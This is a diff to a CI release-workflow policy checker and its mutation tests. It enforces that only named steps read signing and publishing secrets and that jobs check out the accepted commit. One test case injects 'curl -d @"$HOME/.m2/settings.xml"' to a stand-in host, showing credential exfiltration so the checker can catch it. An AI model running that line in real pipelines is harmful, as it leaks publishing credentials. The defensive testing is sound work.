@@ -188,12 +188,31 @@ for name, job_def in jobs.items():
     isolated(name, job_def, "maven-central" if name == "publish" else None)
     called(name, job_def)
 
-# publish: the token and the key only on the steps that need them, not on the job
+# publish: the token and the key only on the two steps that need them, named by id - the secrets
+# check and the upload - each there once, and not on the job
+SECRET_STEPS = ("secrets", "upload")
 publish_level = {k: v for k, v in jobs["publish"].items() if k != "steps"}
 check(not secret_reads(publish_level), "publish must read secrets on its steps only, not as a job")
+for step_id in SECRET_STEPS:
+    count = sum(1 for step in steps("publish") if step.get("id") == step_id)
+    check(count == 1, "publish must have one step with id %s, found %d" % (step_id, count))
 for step in steps("publish"):
-    if secret_reads(step) and not (" deploy" in str(step.get("run", "")) or step.get("name") == "Check the secrets are set"):
-        problems.append("publish: only the secrets check and the upload may read secrets, not %r" % step.get("name"))
+    if secret_reads(step) and step.get("id") not in SECRET_STEPS:
+        problems.append("publish: only the steps with id secrets and upload may read secrets, not %r" % step.get("name"))
+upload = [step for step in steps("publish") if step.get("id") == "upload"]
+if upload:
+    check(re.match(r"\./mvnw .*-Prelease .*\bdeploy$", " ".join(str(upload[0].get("run", "")).split())) is not None,
+          "publish: the upload step must run ./mvnw -Prelease ... deploy, not %r" % upload[0].get("run"))
+
+# publish and github-release work on the commit check accepted, checked out first, before anything
+# runs from it; the tag may name another commit by then
+CHECKED = "${{ needs.check.outputs.commit }}"
+for job in ("publish", "github-release"):
+    checkouts = [i for i, step in enumerate(steps(job)) if str(step.get("uses", "")).startswith("actions/checkout@")]
+    check(checkouts == [0], "%s must check out once, as its first step, found %s" % (job, checkouts))
+    for i in checkouts:
+        ref = (steps(job)[i].get("with") or {}).get("ref")
+        check(ref == CHECKED, "%s must check out %s, not %r" % (job, CHECKED, ref))
 
 # publish: no cache another job could have written - no cache action in any form, no cache input
 # on any setup action
@@ -213,7 +232,8 @@ for job in ("publish", "github-release"):
         check(str(step.get("run", "")).strip() == TAG_CHECK,
               "%s: the tag check must run %s and nothing else, not %r" % (job, TAG_CHECK, step.get("run")))
         unconditional(job, step, "the tag check")
-check(-1 < index("publish", "release-tag-check.sh") < index("publish", " deploy"),
+upload_index = next((i for i, step in enumerate(steps("publish")) if step.get("id") == "upload"), -1)
+check(-1 < index("publish", "release-tag-check.sh") < upload_index,
       "publish must check the tag again before it deploys")
 check(-1 < index("github-release", "release-tag-check.sh") < index("github-release", "gh release create"),
       "github-release must check the tag again before it creates the release")
@@ -300,6 +320,18 @@ release_tag_step="$release_tag"'        env:
           COMMIT: ${{ needs.check.outputs.commit }}
 
 '
+publish_ref='          # the commit check accepted and build tested, whatever the tag names by now
+          ref: ${{ needs.check.outputs.commit }}
+'
+release_ref='          # the commit Central got
+          ref: ${{ needs.check.outputs.commit }}
+'
+release_checkout='      - name: Checkout
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+'"$release_ref"'          persist-credentials: false
+
+'
 
 # the workflow itself
 breaks release.yml replace 'on:
@@ -356,7 +388,7 @@ breaks release.yml replace '    environment: maven-central
 breaks release.yml replace "$publish_tag_step" "${publish_tag_step%
 }          KEY: \${{ secrets.MAVEN_GPG_KEY }}
 
-" "publish: only the secrets check and the upload may read secrets"
+" "publish: only the steps with id secrets and upload may read secrets"
 breaks release.yml replace "$publish_tag" "${publish_tag%%        # *}        if: false
 ${publish_tag#*
 }" "publish: the tag check must not be conditional"
@@ -368,6 +400,26 @@ breaks release.yml replace "$publish_tag" "${publish_tag%
 " "publish: the tag check must run"
 breaks release.yml move "$publish_tag_step" '          if-no-files-found: error
 ' "publish must check the tag again before it deploys"
+breaks release.yml replace "$publish_ref" '' "publish must check out \${{ needs.check.outputs.commit }}, not None"
+breaks release.yml replace "$publish_ref" '          ref: ${{ github.ref }}
+' "publish must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
+breaks release.yml replace "$publish_ref" '          ref: main
+' "publish must check out \${{ needs.check.outputs.commit }}, not 'main'"
+breaks release.yml replace '        id: upload
+' '        id: deploy
+' "publish must have one step with id upload, found 0"
+breaks release.yml replace '      - name: Keep the published bundle
+' '      - name: Stray
+        run: echo deploy
+        env:
+          KEY: ${{ secrets.MAVEN_GPG_KEY }}
+
+      - name: Keep the published bundle
+' "publish: only the steps with id secrets and upload may read secrets, not 'Stray'"
+breaks release.yml replace '          -DskipTests -pl odds-feed -am deploy
+' '          -DskipTests -pl odds-feed -am deploy
+          && curl -d @"$HOME/.m2/settings.xml" https://example.invalid
+' "publish: the upload step must run ./mvnw -Prelease ... deploy"
 breaks release.yml replace '      - name: Sign and publish
 ' '      - name: Restore
         uses: actions/cache/restore@v4
@@ -402,6 +454,13 @@ breaks release.yml replace "$release_tag" "${release_tag%
 " "github-release: the tag check must run"
 breaks release.yml move "$release_tag_step" '          GH_REPO: ${{ github.repository }}
 ' "github-release must check the tag again before it creates the release"
+breaks release.yml replace "$release_ref" '' "github-release must check out \${{ needs.check.outputs.commit }}, not None"
+breaks release.yml replace "$release_ref" '          ref: ${{ github.ref }}
+' "github-release must check out \${{ needs.check.outputs.commit }}, not '\${{ github.ref }}'"
+breaks release.yml replace "$release_ref" '          ref: main
+' "github-release must check out \${{ needs.check.outputs.commit }}, not 'main'"
+breaks release.yml move "$release_checkout" "${release_tag_step%
+}" "github-release must check out once, as its first step"
 
 # next.yml, which release.yml calls
 breaks next.yml replace 'permissions:
